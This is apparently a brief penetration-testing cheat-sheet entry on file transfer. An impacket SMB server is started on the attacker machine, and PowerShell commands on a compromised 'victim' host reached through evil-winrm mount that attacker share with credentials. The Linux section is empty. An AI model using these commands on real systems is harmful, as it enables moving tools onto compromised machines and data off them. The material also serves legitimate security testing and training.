## Windows

impacket-smbserver on attacker machine. Useful when transferring through evilwinrm
```
impacket-smbserver <NameOfServer> $(pwd) -smb2support -user <AnyUser-UsedForLater> -password <AnyPassword-UsedForLater>
```
On the victim Evilwinrm box
```
$pass = convertto-securestring <'AnyPassword'> -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential(<'AnyUser'>, $pass)

New-PSDrive -Name <UserFromLastStep> -PSProvider Filesystem -Credential $cred -Root \\<Attacker.IP.Address.>\<NameOfServer>
```

## Linux
